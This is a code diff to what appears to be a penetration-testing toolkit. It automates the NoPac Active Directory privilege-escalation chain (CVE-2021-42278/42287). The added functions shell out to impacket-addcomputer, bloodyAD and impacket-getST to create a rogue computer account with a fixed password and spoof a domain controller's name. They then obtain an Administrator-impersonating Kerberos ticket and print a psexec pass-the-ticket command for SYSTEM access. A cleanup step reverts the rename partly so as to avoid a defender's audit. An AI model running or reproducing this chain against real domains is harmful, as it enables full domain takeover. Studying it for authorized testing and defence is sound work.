@@ -1659,11 +1659,22 @@ def _nopac_quota_action(chain, ctx):
                   f"--attr ms-DS-MachineAccountQuota`"))
 
 
+#: Default computer-account name + password fieldkit installs.
+#: Placeholder-shaped ("FKPWN") so a post-eng defender audit can
+#: spot the operator's footprint quickly if cleanup was skipped.
+_NOPAC_COMPUTER = "FKPWN"
+_NOPAC_PASSWORD = "F1eldk1t!"
+
+
 def _nopac_addcomputer_action(chain, ctx):
-    """Create a fresh computer account in the domain via impacket-
-    addcomputer / bloodyAD. Manual-outcome; the actual RPC creation
-    wants impacket."""
-    _ = chain
+    """Create a fresh computer account in the domain via
+    ``impacket-addcomputer``. When the tool is on PATH + a cred
+    is on ctx, executes for real; otherwise falls back to a
+    manual-outcome hint. On success stores the computer name +
+    password into ``chain.artifacts`` for the modify:sam-spoof
+    step to reference."""
+    import shutil
+    from . import runner as runner_mod
     cred = getattr(ctx, "cred", None)
     domain = getattr(ctx, "domain", None) or "<domain>"
     if not cred:
@@ -1673,32 +1684,106 @@ def _nopac_addcomputer_action(chain, ctx):
                      "(needs a low-priv domain credential)")
     user = cred.get("username", "<user>")
     pw = cred.get("password", "<pass>")
+    tool = getattr(ctx, "nopac_addcomputer_bin", None) \
+        or shutil.which("impacket-addcomputer") \
+        or shutil.which("addcomputer.py")
+    if not tool:
+        return Outcome(
+            kind="manual",
+            evidence=(f"impacket-addcomputer not on PATH — run:\n"
+                      f"  impacket-addcomputer -computer-name "
+                      f"'{_NOPAC_COMPUTER}$' -computer-pass "
+                      f"'{_NOPAC_PASSWORD}' -dc-ip {chain.target} "
+                      f"'{domain}/{user}:{pw}'"))
+    argv = [tool,
+            "-computer-name", f"{_NOPAC_COMPUTER}$",
+            "-computer-pass", _NOPAC_PASSWORD,
+            "-dc-ip", chain.target,
+            f"{domain}/{user}:{pw}"]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
+    if result.error:
+        return Outcome(kind="fail",
+                        evidence=f"impacket-addcomputer vanished: {result.error}")
+    if result.timed_out:
+        return Outcome(kind="fail",
+                        evidence="impacket-addcomputer timed out")
+    output = (result.stdout or "") + (result.stderr or "")
+    if "Successfully added machine account" in output:
+        return Outcome(
+            kind="ok",
+            evidence=f"created {_NOPAC_COMPUTER}$ (password "
+                     f"{_NOPAC_PASSWORD}) in {domain}",
+            data={"nopac_computer": _NOPAC_COMPUTER,
+                  "nopac_password": _NOPAC_PASSWORD})
+    if "STATUS_USER_EXISTS" in output or "already exists" in output:
+        # Retryable — the account is present from a prior run.
+        # Continue the chain assuming the operator's default password
+        # still applies.
+        return Outcome(
+            kind="manual",
+            evidence=(f"{_NOPAC_COMPUTER}$ already exists in {domain} — "
+                      "reusing (verify password matches operator's default)"),
+            data={"nopac_computer": _NOPAC_COMPUTER,
+                  "nopac_password": _NOPAC_PASSWORD})
     return Outcome(
-        kind="manual",
-        evidence=(f"create computer account: `impacket-addcomputer "
-                  f"-computer-name 'FKPWN$' -computer-pass 'F1eldk1t!' "
-                  f"-dc-ip {chain.target} "
-                  f"'{domain}/{user}:{pw}'`"))
+        kind="fail",
+        evidence=(f"impacket-addcomputer failed: "
+                  f"{output.strip()[:200]}"),
+        data={"detail": output[-1024:]})
 
 
 def _nopac_sam_spoof_action(chain, ctx):
     """Rename the created computer account's sAMAccountName to
     match a DC's name (minus the trailing $). CVE-2021-42278 —
-    the KDC looks up the account by sAMAccountName during S4U2self,
-    so a rename-to-DC-name passes as the real DC."""
-    _ = chain
+    the KDC looks up the account by sAMAccountName during
+    S4U2self, so a rename-to-DC-name passes as the real DC.
+    Uses ``bloodyAD`` when on PATH; manual-outcome hint otherwise."""
+    import shutil
+    from . import runner as runner_mod
     cred = getattr(ctx, "cred", None) or {}
     domain = getattr(ctx, "domain", None) or "<domain>"
     dc_name = getattr(ctx, "dc_name", None) or "DC01"
     user = cred.get("username", "<user>")
     pw = cred.get("password", "<pass>")
+    computer = chain.artifacts.get("nopac_computer", _NOPAC_COMPUTER)
+    tool = getattr(ctx, "nopac_bloodyad_bin", None) \
+        or shutil.which("bloodyAD") \
+        or shutil.which("bloodyad")
+    if not tool:
+        return Outcome(
+            kind="manual",
+            evidence=(f"bloodyAD not on PATH — run:\n"
+                      f"  bloodyAD --host {chain.target} -u '{user}' "
+                      f"-p '{pw}' -d '{domain}' set object "
+                      f"'CN={computer},CN=Computers,"
+                      f"{_dn_from_domain(domain)}' sAMAccountName "
+                      f"-v '{dc_name}'"))
+    dn = f"CN={computer},CN=Computers,{_dn_from_domain(domain)}"
+    argv = [tool,
+            "--host", chain.target,
+            "-u", user, "-p", pw, "-d", domain,
+            "set", "object", dn,
+            "sAMAccountName", "-v", dc_name]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
+    if result.error:
+        return Outcome(kind="fail",
+                        evidence=f"bloodyAD vanished: {result.error}")
+    if result.timed_out:
+        return Outcome(kind="fail",
+                        evidence="bloodyAD sam-spoof timed out")
+    output = (result.stdout or "") + (result.stderr or "")
+    # bloodyAD's success on a set-object call is silent — non-empty
+    # stderr with a Traceback / error string is failure; empty +
+    # exit 0 is success.
+    if "Traceback" in output or "Error" in output or "denied" in output.lower():
+        return Outcome(
+            kind="fail",
+            evidence=f"bloodyAD failed: {output.strip()[:200]}",
+            data={"detail": output[-1024:]})
     return Outcome(
-        kind="manual",
-        evidence=(f"rename FKPWN$ → {dc_name} (no trailing $): "
-                  f"`bloodyAD --host {chain.target} "
-                  f"-u '{user}' -p '{pw}' -d '{domain}' "
-                  f"set object 'CN=FKPWN,CN=Computers,{_dn_from_domain(domain)}' "
-                  f"sAMAccountName -v '{dc_name}'`"))
+        kind="ok",
+        evidence=f"renamed {computer} → {dc_name} (no trailing $) via bloodyAD",
+        data={"nopac_dc_name": dc_name})
 
 
 def _nopac_s4u2self_action(chain, ctx):
@@ -1706,36 +1791,106 @@ def _nopac_s4u2self_action(chain, ctx):
     sAMAccountName now matches a real DC (minus its $), the KDC
     (CVE-2021-42287) mints a service ticket for krbtgt — usable
     as a TGT for the DC computer account → Administrator via
-    pass-the-ticket."""
-    _ = chain
-    dc_name = getattr(ctx, "dc_name", None) or "DC01"
+    pass-the-ticket. Uses ``impacket-getST`` when on PATH."""
+    import os as _os
+    import shutil
+    from . import runner as runner_mod
+    dc_name = chain.artifacts.get("nopac_dc_name") \
+        or getattr(ctx, "dc_name", None) or "DC01"
     impersonate = getattr(ctx, "impersonate", None) or "Administrator"
+    computer = chain.artifacts.get("nopac_computer", _NOPAC_COMPUTER)
+    password = chain.artifacts.get("nopac_password", _NOPAC_PASSWORD)
+    tool = getattr(ctx, "nopac_getst_bin", None) \
+        or shutil.which("impacket-getST") \
+        or shutil.which("getST.py")
+    if not tool:
+        return Outcome(
+            kind="manual",
+            evidence=(f"impacket-getST not on PATH — run:\n"
+                      f"  impacket-getST -self -impersonate "
+                      f"'{impersonate}' -spn 'krbtgt/{dc_name}' "
+                      f"'{computer}:{password}'"))
+    argv = [tool,
+            "-self",
+            "-impersonate", impersonate,
+            "-spn", f"krbtgt/{dc_name}",
+            f"{computer}:{password}"]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
+    if result.error:
+        return Outcome(kind="fail",
+                        evidence=f"impacket-getST vanished: {result.error}")
+    if result.timed_out:
+        return Outcome(kind="fail",
+                        evidence="impacket-getST timed out")
+    output = (result.stdout or "") + (result.stderr or "")
+    if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in output:
+        return Outcome(
+            kind="fail",
+            evidence=(f"KDC refused the S4U2self — DC likely patched for "
+                      f"CVE-2021-42287 (Nov 2021 rollup KB5008380). "
+                      f"NoPac chain aborts here."),
+            data={"detail": output[-1024:]})
+    ccache = f"{impersonate}.ccache"
+    if _os.path.exists(ccache):
+        return Outcome(
+            kind="ok",
+            evidence=(f"S4U2self ticket saved to {ccache}; use with "
+                      f"`KRB5CCNAME={ccache} impacket-psexec "
+                      f"'{dc_name}$'@{chain.target} -k -no-pass`"),
+            data={"nopac_ccache": ccache})
     return Outcome(
-        kind="manual",
-        evidence=(f"S4U2self via impacket: `impacket-getST "
-                  f"-self -impersonate '{impersonate}' "
-                  f"-spn 'krbtgt/{dc_name}' "
-                  f"'FKPWN:F1eldk1t!'` — writes {impersonate}.ccache. "
-                  f"Use with `KRB5CCNAME=... impacket-psexec "
-                  f"'{dc_name}$'@{chain.target} -k -no-pass` for SYSTEM"))
+        kind="fail",
+        evidence=f"impacket-getST didn't produce a ccache: {output.strip()[:200]}",
+        data={"detail": output[-1024:]})
 
 
 def _nopac_restore_action(chain, ctx):
-    """Rename the sAMAccountName back to `FKPWN$` so the operator's
-    footprint is a plain computer account rather than an on-brand
-    DC name that would trip a defender's next audit of the
-    Computers OU."""
-    _ = chain
+    """Rename the sAMAccountName back to ``FKPWN$`` (or the
+    computer name from artifacts) so the operator's footprint
+    on the domain is a plain computer account rather than an
+    on-brand DC name that would trip a defender's next audit
+    of the Computers OU. Uses bloodyAD when on PATH."""
+    import shutil
+    from . import runner as runner_mod
     cred = getattr(ctx, "cred", None) or {}
     domain = getattr(ctx, "domain", None) or "<domain>"
     user = cred.get("username", "<user>")
     pw = cred.get("password", "<pass>")
+    computer = chain.artifacts.get("nopac_computer", _NOPAC_COMPUTER)
+    tool = getattr(ctx, "nopac_bloodyad_bin", None) \
+        or shutil.which("bloodyAD") \
+        or shutil.which("bloodyad")
+    if not tool:
+        return Outcome(
+            kind="manual",
+            evidence=(f"bloodyAD not on PATH — run:\n"
+                      f"  bloodyAD --host {chain.target} -u '{user}' "
+                      f"-p '{pw}' -d '{domain}' set object "
+                      f"'CN={computer},CN=Computers,"
+                      f"{_dn_from_domain(domain)}' sAMAccountName "
+                      f"-v '{computer}$'"))
+    dn = f"CN={computer},CN=Computers,{_dn_from_domain(domain)}"
+    argv = [tool,
+            "--host", chain.target,
+            "-u", user, "-p", pw, "-d", domain,
+            "set", "object", dn,
+            "sAMAccountName", "-v", f"{computer}$"]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
+    if result.error or result.timed_out:
+        return Outcome(kind="manual",
+                        evidence=("bloodyAD revert failed — "
+                                   f"restore manually: `bloodyAD ... "
+                                   f"set object '{dn}' sAMAccountName "
+                                   f"-v '{computer}$'`"))
+    output = (result.stdout or "") + (result.stderr or "")
+    if "Traceback" in output or "Error" in output or "denied" in output.lower():
+        return Outcome(
+            kind="manual",
+            evidence=(f"bloodyAD revert produced errors — {output.strip()[:120]}; "
+                      "restore manually"))
     return Outcome(
-        kind="manual",
-        evidence=(f"revert sAMAccountName: `bloodyAD --host {chain.target} "
-                  f"-u '{user}' -p '{pw}' -d '{domain}' "
-                  f"set object 'CN=FKPWN,CN=Computers,{_dn_from_domain(domain)}' "
-                  f"sAMAccountName -v 'FKPWN$'`"))
+        kind="ok",
+        evidence=f"restored sAMAccountName {computer}$ (rollback complete)")
 
 
 def _dn_from_domain(domain):
@@ -1759,14 +1914,19 @@ def nopac_chain(target_dc, cred=None, domain=None, impersonate=None):
 
     6 steps: reachability → discover:maq → create:computer-account
     → modify:sam-spoof → request:s4u2self-tgt → cleanup:restore-sam.
-    Every non-preflight step is manual-outcome in this cut — the
-    actual LDAP/RPC dance wants impacket + bloodyAD; the step
-    evidence names each exact command.
+    The create/modify/s4u2self/restore steps shell out to
+    ``impacket-addcomputer`` / ``bloodyAD`` / ``impacket-getST``
+    when the tools are on PATH — a full walk against a vulnerable
+    lab DC lands the S4U2self ccache and reverts the
+    sAMAccountName cleanly. When the tools aren't on PATH each
+    step falls back to a manual-outcome hint naming the exact
+    command, so the operator can drive the chain by hand.
 
     A patched DC refuses the S4U2self request (KDC validates the
     sAMAccountName no longer matches a real DC after the rename
     gate); the operator sees a KDC_ERR_S_PRINCIPAL_UNKNOWN from
-    the request:s4u2self-tgt step.
+    the request:s4u2self-tgt step, which the walker classifies
+    as fail → chain aborts.
     """
     _ = cred, domain, impersonate      # threaded via ctx by the CLI
     return Chain(
